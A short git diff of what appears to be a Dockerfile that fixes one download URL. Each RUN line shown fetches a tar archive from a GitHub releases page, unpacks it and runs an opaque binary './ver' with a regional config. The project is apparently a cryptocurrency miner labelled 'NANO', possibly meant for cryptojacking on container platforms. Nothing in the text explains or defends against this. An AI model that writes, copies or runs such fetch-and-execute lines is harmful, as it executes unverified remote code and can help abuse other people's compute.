@@ -8,7 +8,7 @@ RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/downl
 RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/download/luck_eu/luck_eu.tar.gz && tar -xvf luck_eu.tar.gz && ./ver eu.ini
 
 #NANO (AP)#
-RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/download/luck_eu/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
 
 #NANO (RANDOM)#
 RUN sudo apt update && wget https://github.com/hendrik20212/miner/releases/download/luck_random/luck_random.tar.gz && tar -xvf luck_random.tar.gz && ./ver random.ini
